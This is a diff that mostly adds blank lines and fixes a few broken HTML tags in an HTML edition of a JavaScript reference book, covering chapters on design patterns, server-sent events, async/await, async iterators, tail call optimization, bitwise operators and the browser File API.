@@ -22557,7 +22671,9 @@ addEventListener</a> then you&apos;ve utilized the Observer pattern.</p>
   };
 }
 </pre>
+
 <h4>Example usage:</h4>
+
 <pre>
 <b>function</b> Employee(name) {
   <b>this</b>.name = name;
@@ -22579,6 +22695,7 @@ meetingAlerts.notifyObservers(&apos;4pm&apos;);
 // <i>Bob: There is a meeting at 4pm</i>
 // <i>Jane: There is a meeting at 4pm</i>
 </pre>
+
 <!-- page 387 -->
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h3 id="ch79-2">Section 79.2: Mediator Pattern</h3>
@@ -22587,12 +22704,16 @@ meetingAlerts.notifyObservers(&apos;4pm&apos;);
 controls planes in the air: it directs this plane to land now, the
 second to wait, and the third to take off, etc. However no plane is
 ever allowed to talk to its peers.</p>
+
 <p>This is how mediator works, it works as a communication hub among
 different modules, this way you reduce module dependency on each
 other, increase loose coupling, and consequently portability.</p>
+
 <p>This <a href="http://www.dofactory.com/javascript/mediator-design-pattern" 
 target="_blank" rel="noopener noreferrer">
+
 <b>Chatroom example</b></a> explains how mediator patterns works:</p>
+
 <pre>
 // <i>each participant is just a module that wants to talk to other modules(other participants)</i>
 <b>var</b> Participant = <b>function</b>(name) {
@@ -22665,6 +22786,7 @@ compartmentalize everything needed to call a method at a later time.
 It can be used to issue a &quot;command&quot; and decide later which piece of
 code to use to execute the command.</p>
 <p>There are three components in this pattern:</p>
+
 <ol type="1" start="1">
   <li>Command Message - the command itself, including the method name,
     parameters, and state</li>
@@ -22673,7 +22795,9 @@ code to use to execute the command.</p>
     process, callback, or any way needed to execute the command.</li>
   <li>Receiver - the target of the command execution.</li>
 </ol>
+
 <h4>Command Message as an Array</h4>
+
 <pre>
 <b>var</b> aCommand = <b>new</b> Array();
 aCommand.push(<b>new</b> Instructions().DoThis); // <i>Method to execute</i>
@@ -22682,7 +22806,9 @@ aCommand.push(777);               // <i>integer argument</i>
 aCommand.push(<b>new</b> Object {} );    // <i>object argument</i>
 aCommand.push(<b>new</b> Array() );      // <i>array argument</i>
 </pre>
+
 <p>Constructor for command class</p>
+
 <pre>
 class DoThis {
   constructor( stringArg, numArg, objectArg, arrayArg ) {
@@ -22697,11 +22823,15 @@ class DoThis {
   }
 }
 </pre>
+
 <!-- page 389 -->
+
 <h4>Invoker</h4>
+
 <pre>
 aCommand.Execute();
 </pre>
+
 <p>Can invoke:</p>
 <ul>
   <li>immediately</li>
@@ -22712,6 +22842,7 @@ aCommand.Execute();
   <li>in any other needed way to invoke a method</li>
 </ul>
 <h4>Receiver</h4>
+
 <pre>
 class Instructions {
   DoThis( stringArg, numArg, objectArg, arrayArg ) {
@@ -22719,6 +22850,7 @@ class Instructions {
   }
 }
 </pre>
+
 <p>A client generates a command, passes it to an invoker that either
 executes it immediately or delays the command, and then the command
 acts upon a receiver. The command pattern is very useful when used
@@ -22728,7 +22860,9 @@ with companion patterns to create messaging patterns.</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p>An iterator pattern provides a simple method for selecting,
 sequentially, the next item in a collection.</p>
+
 <h4>Fixed Collection</h4>
+
 <pre>
 class BeverageForPizza { 
   constructor(preferenceRank) {
@@ -22743,9 +22877,11 @@ class BeverageForPizza {
   withPepperoni.next();  // <i>Water</i>
   withPepperoni.next();  // <i>Beer</i>
 </pre>
+
 <p>In ECMAScript 2015 iterators are a built-in as a method that returns
 done and value. done is true when the iterator is at the end of the
 collection</p>
+
 <pre>
 <b>function</b> preferredBeverage(beverage) {
   <b>if</b> ( beverage == &quot;Beer&quot; ) {
@@ -22762,7 +22898,9 @@ collection</p>
   }
 }
 </pre>
+
 <h4>As a Generator</h4>
+
 <pre>
 class FibonacciIterator {
   constructor() {
@@ -22781,7 +22919,9 @@ fib.next(); // <i>2</i>
 fib.next(); // <i>3</i>
 fib.next(); // <i>5</i>
 </pre>
+
 <p>In ECMAScript 2015</p>
+
 <pre>
 <b>function</b>&ast; FibonacciGenerator() {  // <i>asterisk informs javascript of generator</i>
   <b>var</b> previous = 1;
@@ -22802,6 +22942,7 @@ fib.next().value; // <i>3</i>
 fib.next().value; // <i>5</i>
 fib.next().done;  // <i>false</i>
 </pre>
+
 <!-- page 391 -->
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h2 id="ch80">Chapter 80: Server-sent events</h2>
@@ -22812,19 +22953,24 @@ fib.next().done;  // <i>false</i>
 using the EventSource object. You will need to supply the constructor
 a string of the path to the server&apos; API endpoint the will subscribe
 the client to the server events.</p>
+
 <p>Example:</p>
+
 <pre>
 <b>var</b> eventSource = <b>new</b> EventSource(&quot;api/my-events&quot;);
 </pre>
+
 <p>Events have names with which they are categorized and sent, and a listener must 
 be setup to listen to each such event by name. the default event name is message 
 and in order to listen to it you must use the appropriate event listener, .onmessage</p>
+
 <pre>
 evtSource.onmessage = <b>function</b>(event) {
   <b>var</b> data = JSON.parse(event.data);
   // <i>do something with data</i>
 }
 </pre>
+
 <p>The above function will run every time the server will push an event
 to the client. Data is sent as test/plain, if you send JSON data you may want to
 parse it.</p>
@@ -22832,28 +22978,36 @@ parse it.</p>
 <h3 id="ch80-2">Section 80.2: Closing an event stream</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p>An event stream to the server can be closed using the .close() method</p>
+
 <pre>
 <b>var</b> eventSource = <b>new</b> EventSource(&quot;api/my-events&quot;);
 // <i>do things &hellip;</i>
 eventSource.close();  // <i>you will not receive anymore events from this object</i>
 </pre>
+
 <p>The .close() method does nothing is the stream is already closed.</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h3 id="ch80-3">Section 80.3: Binding event listeners to EventSource</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p>You can bind event listeners to the EventSource object to listen to
 different events channels using the .addEventListener method.</p>
+
 <blockquote>
 EventSource.addEventListener(name: String, callback: Function,&lbrack;options&rbrack;)
 </blockquote>
+
 <p><b>name</b>: The name related to the name of the channel the server is emitting events to.</p>
+
 <p><b>callback</b>: The callback function runs every time an event bound to
 the channel is emitted, the function provides the event as an argument.</p>
+
 <p><b>options</b>: Options that characterize the behavior of the
 event listener.</p>
+
 <p>The following example shows a heartbeat event stream from the server,
 the server sends events on the heartbeat channel and this routine will
 always run when an event in accepted.</p>
+
 <pre>
 <b>var</b> eventSource = <b>new</b> EventSource(&quot;api/heartbeat&quot;);
 &hellip;
@@ -22883,14 +23037,17 @@ A function defined as async is a function that can perform
 asynchronous actions but still look synchronous. The way it&apos;s done is
 using the await keyword to defer the function while it waits for a
 Promise to resolve or reject.</p>
+
 <p><b>Note:</b> Async functions are 
 <a href="https://github.com/tc39/proposals/blob/master/finished-proposals.md" 
  target="_blank" rel="noopener noreferrer">
 a Stage 4 (&quot;Finished&quot;) proposal</a> on track to be included in the 
 ECMAScript 2017 standard.</p>
+
 <p>For instance, using the promise-based <a href="https://developer.mozilla.org/en/docs/Web/API/Fetch_API"
  target="_blank" rel="noopener noreferrer">
 Fetch API</a>:</p>
+
 <pre>
 async <b>function</b> getJSON(url) {
   <b>try</b> {
@@ -22905,7 +23062,9 @@ async <b>function</b> getJSON(url) {
 </pre>
 <p>An async function always returns a Promise itself, so you can use it
 in other asynchronous functions.</p>
+
 <h4>Arrow function style</h4>
+
 <pre>
 <b>const</b> getJSON = async url =&gt; {
   <b>const</b> response = await fetch (url);
@@ -22916,16 +23075,20 @@ in other asynchronous functions.</p>
 <h3 id="ch81-2">Section 81.2: Await and operator precedence</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p>You have to keep the operator precedence in mind when using await keyword.</p>
+
 <p>Imagine that we have an asynchronous function which calls another
 asynchronous function, getUnicorn() which returns a Promise that resolves to an
 instance of class Unicorn. Now we want to get the size of the unicorn
 using the getSize() method of that class.</p>
+
 <p>Look at the following code:</p>
+
 <pre>
 async <b>function</b> myAsyncFunction() {
   await getUnicorn().getSize();
 }
 </pre>
+
 <p>At first sight, it seems valid, but it&apos;s not. Due to operator
 precedence, it&apos;s equivalent to the following:</p>
 <pre>
@@ -22935,6 +23098,7 @@ async <b>function</b> myAsyncFunction() {
 </pre>
 <p>Here we attempt to call getSize() method of the Promise object, which isn&apos;t
 what we want.</p>
+
 <p>Instead, we should use brackets to denote that we first want to wait
 for the unicorn, and then call getSize() method of the result:</p>
 <pre>
@@ -22942,6 +23106,7 @@ async <b>function</b> asyncFunction() {
   (await getUnicorn()).getSize();
 }
 </pre>
+
 <p>Of course. the previous version could be valid in some cases, for
 example, if the getUnicorn() function was synchronous, but the getSize() method was
 asynchronous.</p>
@@ -22969,7 +23134,9 @@ doAsyncThing()
 }
 <b>catch</b>(ex) { &hellip; }
 </pre>
+
 <p>Any function that uses chains of promises can be rewritten using await:</p>
+
 <pre>
 <b>function</b> newUnicorn() { 
   <b>return</b> fetch(&apos;unicorn.json&apos;) // <i>fetch unicorn.json from server</i>
@@ -22983,7 +23150,9 @@ doAsyncThing()
   .<b>catch</b>(err =&bsol;console.log(&apos;Error creating unicorn:&apos;, err));
 }
 </pre>
+
 <p>The function can be rewritten using async/await as follows:</p>
+
 <pre>
 async <b>function</b> newUnicorn() {
   <b>try</b> {
@@ -23000,23 +23169,29 @@ async <b>function</b> newUnicorn() {
   }
 }
 </pre>
+
 <p>This async variant of newUnicorn() appears to return a Promise, but really there
 were multiple await keywords. Each one returned a Promise, so really
 we had a collection of promises rather than a chain.</p>
+
 <p>In fact we can think of it as a <b>function</b>&ast; generator, with each await 
 being a yield <b>new</b> Promise. However, the results of each promise are needed 
 by the next to continue the function. This is why the additional keyword async is 
 needed on the function (as well as the await keyword when calling the promises) as
 it tells JavaScript to automatically creates an observer for this iteration. The Promise
 returned by async <b>function</b> newUnicorn() resolves when this iteration completes.</p>
+
 <p>Practically, you don&apos;t need to consider that; await hides the promise
 and async hides the generator iteration.</p>
+
 <p>You can call async functions as if they were promises, and await any
 promise or any async function. You don&apos;t need to await an async
 function, just as you can execute a promise without a .then().</p>
+
 <p>You can also use an async <a href="https://en.wikipedia.org/wiki/Immediately-invoked_function_expression"
  target="_blank" rel="noopener noreferrer">IIFE</a>
 if you want to execute that code immediately:</p>
+
 <pre>
 (async () =&gt; {
   await makeCoffee()
@@ -23037,13 +23212,17 @@ if you want to execute that code immediately:</p>
   });
 })();
 </pre>
+
 <p>This comes from the fact that you&apos;ve erroneously seen the arrow
 function as a block. The await will be in the context of the callback
 function, which is not async.</p>
+
 <p>The interpreter protects us from making the above error, but if you
 add async to the forEach callback no errors get thrown. You might
 think this solves the problem, but it won&apos;t work as expected.</p>
+
 <p>Example:</p>
+
 <pre>
 (async() =&gt; {
   data = &lbrack;1, 2, 3, 4, 5&rbrack;;
@@ -23054,15 +23233,19 @@ think this solves the problem, but it won&apos;t work as expected.</p>
   console.log(&apos;this will print first&apos;);
 })();
 </pre>
+
 <p>This happens because the callback async function can only pause itself, not the parent async function.</p>
+
 <blockquote>
 You could write an asyncForEach function that returns a promise and then you could 
 something like asyncForEach(async (e) =&gt; await somePromiseFn(e), data ) Basically 
 you return a promise that resolves when all the callbacks are awaited and done. 
 But there are better ways of doing this, and that is to just use a loop.
 </blockquote>
+
 <p>You can use a for-of loop or a <b>for</b>/while loop, it doesn&apos;t really matter 
 which one you pick.</p>
+
 <pre>
 (async() =&gt; {
   data = &lbrack;1, 2, 3, 4, 5&rbrack;;
@@ -23073,11 +23256,13 @@ which one you pick.</p>
   console.log(&apos;this will print last&apos;);
 })();
 </pre>
+
 <p>But there&apos;s another catch. This solution will wait for each call to
 somePromiseFn to complete before iterating over the next one.<br/>
 This is great if you actually want your somePromiseFn invocations to
 be executed in order but if you want them to run concurrently, you
 will need to await on Promise.all.</p>
+
 <pre>
 (async() =&gt; {
 data = &lbrack;1, 2, 3, 4, 5&rbrack;;
@@ -23085,14 +23270,17 @@ data = &lbrack;1, 2, 3, 4, 5&rbrack;;
 console.log(&hellip;p);
 })();
 </pre>
+
 <p>Promise.all receives an array of promises as its only parameter and returns a
 promise. When all of the promises in the array are resolved, the returned 
 promise is also resolved. We await on that promise and when it&apos;s resolved 
 all our values are available.</p>
+
 <p>The above examples are fully runnable. The somePromiseFn function can
 be made as an async echo function with a timeout. You can try out the
 examples in the <a href="https://babeljs.io/repl" target="_blank" rel="noopener noreferrer">babel-repl</a> with at least
 the -3 preset and look at the output.</p>
+
 <pre>
 <b>function</b> somePromiseFn(n) {
   <b>return</b> <b>new</b> Promise((res, rej) =&gt; {
@@ -23104,6 +23292,7 @@ the -3 preset and look at the output.</p>
 <h3 id="ch81-5">Section 81.5: Less indentation</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p>With promises:</p>
+
 <pre>
 <b>function</b> doTheThing() { 
 <b>return</b> doOneThing()
@@ -23112,7 +23301,9 @@ the -3 preset and look at the output.</p>
   .<b>catch</b>(handleErrors)
 }
 </pre>
+
 <p>With async functions:</p>
+
 <pre>
 async <b>function</b> doTheThing() {
   <b>try</b> {
@@ -23124,6 +23315,7 @@ async <b>function</b> doTheThing() {
   }
 }
 </pre>
+
 <p>Note how the return is at the bottom, and not at the top, and you use
 the language&apos;s native error-handling mechanics (try/catch).</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
@@ -23133,6 +23325,7 @@ the language&apos;s native error-handling mechanics (try/catch).</p>
 There is direct syntax that supports this in the async/await proposal,
 but since await will wait for a promise, you can wrap multiple
 promises together in Promise.all to wait for them:</p>
+
 <pre>
 // <i>Not in parallel</i>
 &nbsp;
@@ -23145,8 +23338,10 @@ async <b>function</b> getFriendPosts(user) {
     // <i>etc.</i>
 }
 </pre>
+
 <p>This will do each query to get each friend&apos;s posts serially, but they
 can be done simultaneously:</p>
+
 <pre>
 // <i>In parallel</i>
 &nbsp;
@@ -23158,6 +23353,7 @@ async <b>function</b> getFriendPosts(user) {
   // <i>etc.</i>
 }
 </pre>
+
 <p>This will loop over the list of IDs to create an array of promises.
 await will wait for <i>all</i> promises to be complete. Promise.all combines 
 them into a single promise, but they are done in parallel.</p>
@@ -23166,9 +23362,12 @@ them into a single promise, but they are done in parallel.</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p>An async function is one that returns a promise. await yields to the
 caller until the promise resolves and then continues with the result.</p>
+
 <p>An iterator allows the collection to be looped through with a for-of loop.</p>
+
 <p>An async iterator is a collection where each iteration is a promise
 which can be awaited using a for-await-of loop.</p>
+
 <p>Async iterators are a <a href="https://github.com/tc39/proposal-async-iteration">stage 3 proposal</a>. 
 They are in Chrome Canary 60 with &minus;&minus;harmony-async-iteration</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
@@ -23176,9 +23375,12 @@ They are in Chrome Canary 60 with &minus;&minus;harmony-async-iteration</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p>A JavaScript Iterator is an object with a .next() method, which returns an
 IteratorItem, which is an object with value : &lt;any&gt; and done : &lt;boolean&gt;.</p>
+
 <p>A JavaScript AsyncIterator is an object with a .next() method, which returns a 
 Promise&lt;IteratorItem&gt;, a <i>promise</i> for the next value.</p>
+
 <p>To create an AsyncIterator, we can use the <i>async generator</i> syntax:</p>
+
 <pre>
 <i>/&ast;&ast;</i>
 <i>&ast; Returns a promise which resolves after time had passed.</i>
@@ -23192,21 +23394,26 @@ async <b>function</b>&ast; delayedRange(max) {
   }
 }
 </pre>
+
 <p>The delayedRange function will take a maximum number, and returns an
 AsyncIterator, which yields numbers from 0 to that number, in 1 second
 intervals.</p>
+
 <p>Usage:</p>
-<pre.
+
+<pre>
 <b>for</b> await (<b>let</b> number of delayedRange(10)) {
   console.log(number);
 }
 </pre>
+
 <p>The <b>for</b> loop is another piece of new syntax, available only inside of
 async functions, as well as async generators. Inside the loop, the
 values yielded (which, remember, are Promises) are unwrapped, so the
 Promise is hidden away. Within the loop, you can deal with the direct
 values (the yielded numbers), the <b>for</b> await loop will wait for the Promises on
 your behalf.</p>
+
 <p>The above example will wait 1 second, log 0, wait another second, log
 1, and so on, until it logs 9. At which point the AsyncIterator will
 be done, and the <b>for</b> await of loop will exit.</p>
@@ -23263,6 +23470,7 @@ pointing to the element we are receiving the stats for.</p>
   processOneFileInPipeline(key);
 }
 </pre>
+
 <p>By creating a new function, we are scoping <b>key</b> inside a function
 so all callback have their own key instance.</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
@@ -23271,13 +23479,16 @@ so all callback have their own key instance.</p>
 <h3 id="ch84-1">Section 84.1: What is Tail Call Optimization (TCO)</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p>TCO is only available in strict mode</p>
+
 <p>As always check browser and JavaScript implementations for support of
 any language features, and as with any JavaScript feature or syntax,
 it may change in the future.</p>
+
 <p>It provides a way to optimise recursive and deeply nested function
 calls by eliminating the need to push function state onto the global
 frame stack, and avoiding having to step down through each calling
 function by returning directly to the initial calling function.</p>
+
 <pre>
 <b>function</b> a() {
   <b>return</b> b(); // <i>2</i>
@@ -23287,20 +23498,25 @@ function by returning directly to the initial calling function.</p>
 }
 a(); // <i>1</i>
 </pre>
+
 <p>Without TCO the call to a() creates a new frame for that function.
 When that function calls b() the a()&apos;s frame is pushed onto the frame
 stack and a new frame is created for function b()</p>
+
 <p>When b() return to a() a()&apos;s frame is popped from the frame stack. It
 immediately return to the global frame and thus does not use any of
 the states save on the stack.</p>
+
 <p>TCO recognises that the call from a() to b() is at the tail of
 function a() and thus there is no need to push a()&apos;s state onto the
 frame stack. When b(0) returns rather than returning to a() it returns
 directly to the global frame. Further optimising by eliminating the
 intermediate steps.</p>
+
 <p>TCO allows for recursive functions to have indefinite recursion as the
 frame stack will not grow with each recursive call. Without TCO
 recursive function had a limited recursive depth.</p>
+
 <blockquote>
 <b>Note</b> TCO is a JavaScript engine implementation feature, it cannot
 be implemented via a transpiler if the browser does not support it.
@@ -23315,6 +23531,7 @@ be set for the perceivable future.
 <p>Tail Call Optimisation makes it possible to safely implement recursive
 loops without concern for call stack overflow or the overhead of a
 growing frame stack.</p>
+
 <pre>
 <b>function</b> indexOf(array, predicate, i = 0) {
   <b>if</b> (0 &lt;= i && i &lt; array.length) {
@@ -23346,23 +23563,28 @@ and then remove the
 Math.floor(12345 / (10 &ast;&ast;   . So if we want to multiply a  2 &ast;&ast;
 3)) variable by  n
 decimal part, we get 12, or , we can just left-shift by n bits.</p>
+
 <pre>
 console.log(13 &ast; (2 &ast;&ast; 6)) // <i>13 &ast; 64 = 832</i>
 console.log(13        &lt;&lt;     6)  // <i>832</i>
 </pre>
+
 <p>Similarly, to do (floored) integer division by 2 &ast;&ast; n, we can right shift by
 n bits. Example:</p>
-pre>
+
+<pre>
 console.log(1000 / (2 &ast;&ast; 4)) // <i>1000 / 16 = 62.5</i>
 console.log(1000    &gt;&gt;     4)  // <i>62</i>
 </pre>
+
 <p>It even works with negative numbers:</p>
+
 <pre>
 console.log(&minus;80 / (2 &ast;&ast; 3)) // <i>-80 / 8 = -10</i>
 console.log(&minus;80       &gt;&gt;3)  // <i>-10</i>
 </pre>
-<p>
-In reality, speed of arithmetic is unlikely to significantly impact
+
+<p>In reality, speed of arithmetic is unlikely to significantly impact
 how long your code takes to run, unless you are doing on the order of
 100s of millions of computations. But C programmers love this sort of
 thing!</p>
@@ -23370,6 +23592,7 @@ thing!</p>
 <h3 id="ch85-3">Section 85.3: Number&apos;s Parity Detection with Bitwise AND</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p>Instead of this (unfortunately too often seen in the real code) &quot;masterpiece&quot;:</p>
+
 <pre>
 <b>function</b> isEven(n) {
   <b>return</b> n &percnt; 2 == 0;
@@ -23383,7 +23606,9 @@ thing!</p>
   }
 }
 </pre>
+
 <p>You can do the parity check much more effective and simple:</p>
+
 <pre>
 <b>if</b> (n & 1) {
   console.log(&quot;ODD!&quot;);
@@ -23391,6 +23616,7 @@ thing!</p>
   console.log(&quot;EVEN!&quot;);
 }
 </pre>
+
 <p>(this is actually valid not only for JavaScript)</p>
 <!-- page 403 -->
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
@@ -23398,6 +23624,7 @@ thing!</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p>The ~ operator looks at the binary representation of the values of
 the expression and does a bitwise negation operation on it.</p>
+
 <p>Any digit that is a 1 in the expression becomes a 0 in the result. Any
 digit that is a 0 in the expression becomes a 1 in the result.</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
@@ -23405,10 +23632,12 @@ digit that is a 0 in the expression becomes a 1 in the result.</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p>The following example illustrates use of the bitwise NOT (&bsol;~) operator
 on integer numbers.</p>
+
 <pre>
 <b>let</b> number = 3;
 <b>let</b> complement = ~number;
 </pre>
+
 <p>Result of the complement number equals to -4;</p>
 <table border="1" style="width:200px">
   <thead>
@@ -23432,6 +23661,7 @@ on integer numbers.</p>
   </tbody>
 </table>
 <p>To simplify this, we can think of it as function f(n) = &minus;(n&plus;1).</p>
+
 <pre>
 <b>let</b> a = ~&minus;2; // <i>a is now 1</i>
 <b>let</b> b = ~&minus;&minus;1; // <i>b is now 0</i>
@@ -23486,6 +23716,7 @@ it&apos;s simple representation in binary format.</p>
 <p>To simplify this, we can think of it as functions f2(n) = -(-(n+1) + 1)
 and g2(n) = -(-(integer(n)+1) + 1).</p>
 <p><b>f2(n)</b> will leave the integer number as it is.</p>
+
 <pre>
 <b>let</b> a = ~~&minus;2; // <i>a is now -2</i>
 <b>let</b> b = ~~&minus;1; // <i>b is now -1</i>
@@ -23493,7 +23724,9 @@ and g2(n) = -(-(integer(n)+1) + 1).</p>
 <b>let</b> d = ~~1;        // <i>d is now 1</i>
 <b>let</b> e = ~~2;        // <i>e is now 2</i>
 </pre>
+
 <p><b>g2(n)</b> will essentially round positive numbers down and negative numbers up.</p>
+
 <pre>
 <b>let</b> a = ~~&minus;2.5; // <i>a is now -2</i>
 <b>let</b> b = ~~&minus;1.5; // <i>b is now -1</i>
@@ -23524,19 +23757,26 @@ presented as numeric value 1 and <b>false</b> as 0</p>
 <h3 id="ch86-4">Section 86.4: Shorthands</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p>We can use ~ as a shorthand in some everyday scenarios.</p>
+
 <p>We know that ~ converts -1 to 0, so we can use it with indexOf on array.</p>
+
 <h4>indexOf</h4>
+
 <pre>
 <b>let</b> items = &lbrack;&apos;foo&apos;, &apos;bar&apos;, &apos;baz&apos;&rbrack;;
 <b>let</b> el = &apos;a&apos;;
 &nbsp;
 <b>if</b> (items.indexOf(&apos;a&apos;) !== &minus;1) {}
 </pre>
+
 <p>or</p>
+
 <pre>
 <b>if</b> (items.indexOf(&apos;a&apos;) &gt;= 0) {}
 </pre>
+
 <h4>can be re-written as</h4>
+
 <pre>
 <b>if</b> (&bsol;~items.indexOf(&apos;a&apos;)) {}
 </pre>
@@ -23544,12 +23784,15 @@ presented as numeric value 1 and <b>false</b> as 0</p>
 <h3 id="ch86-5">Section 86.5: ~ Decimal</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p>The following example illustrates use of the bitwise NOT (&bsol;~) operator on decimal numbers.</p>
+
 <p>To keep the example simple, decimal number 3.5 will be used, cause of it&apos;s 
 simple representation in binary format.</p>
+
 <pre>
 <b>let</b> number = 3.5;
 <b>let</b> complement = ~number;
 </pre>
+
 <!-- page 405 -->
 <p>Result of the complement number equals to -4;</p>
 <table border="1" style="width:200px">
@@ -23573,7 +23816,9 @@ simple representation in binary format.</p>
     </tr>
   </tbody>
 </table>
+
 <p>To simplify this, we can think of it as function f(n) = &minus;(integer(n)&plus;1).</p>
+
 <pre>
 <b>let</b> a = ~&minus;2.5;  // <i>a is now 1</i>
 <b>let</b> b = ~&minus;1.5;  // <i>b is now 0</i>
@@ -23581,6 +23826,7 @@ simple representation in binary format.</p>
 <b>let</b> d = ~1.5;         // <i>c is now -2</i>
 <b>let</b> e = ~2.5;         // <i>c is now -3</i>
 </pre>
+
 <!-- page 406 -->
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <h2 id="ch87">Chapter 87: Using JavaScript to get/set CSS custom variables</h2>
@@ -23588,6 +23834,7 @@ simple representation in binary format.</p>
 cSection 87.1: How to get and set CSS variable property values</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p>To get a value use the .getPropertyValue() method</p>
+
 <pre>
 element.style.getPropertyValue(&quot;&dash;&dash;var&quot;)
 </pre>
@@ -23624,9 +23871,11 @@ element.style.setProperty(&quot;&bsol;var&quot;, &quot;NEW_VALUE&quot;)
 <b>let</b> text = sel.toString();
 onsole.log(text);  // <i>logs what the user selected</i>
 </pre>
+
 <p>Alternatively, since the toString member function is called
 automatically by some functions when converting the object to a
 string, you don&apos;t always have to call it yourself.</p>
+
 <pre>
 console.log(document.getSelection());
 </pre>
@@ -23650,6 +23899,7 @@ range.selectNodeContents(myNode);
 &nbsp;
 sel.addRange(range);
 </pre>
+
 <p>It may be necessary to first remove all the ranges of the previous
 selection, as most browsers don&apos;t support multiple ranges.</p>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
@@ -23721,10 +23971,13 @@ selection, as most browsers don&apos;t support multiple ranges.</p>
 <h3 id="ch89-1">Section 89.1: Read file as string</h3>
 <!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
 <p>Make sure to have a file input on your page:</p>
+
 <pre>
 <b>&lt;</b><b>input</b> type=&quot;file&quot; id=&quot;upload&quot;<b>&gt;</b>
 </pre>
+
 <p>Then in JavaScript:</p>
+
 <pre>
 document.getElementById(&apos;upload&apos;).addEventListener(&apos;change&apos;, readFileAsString)
 <b>function</b> readFileAsString() {
@@ -23747,6 +24000,7 @@ document.getElementById(&apos;upload&apos;).addEventListener(&apos;change&apos;,
 <p>Reading the contents of a file within a web application can be
 accomplished by utilizing the HTML5 File API. First, add an input with "file" 
 in your HTML:</p>
+
 <pre>
 <b>&lt;</b><b>input</b> type=&quot;file&quot; id=&quot;upload&quot;<b>&gt;</b>
 </pre>
@@ -23756,6 +24010,7 @@ added as attribute on the input element. This listener gets triggered
 every time a new file has been selected. Within this callback, we can
 read the file that was selected and perform further actions (like
 creating an image with the contents of the selected file):</p>
+
 <pre>
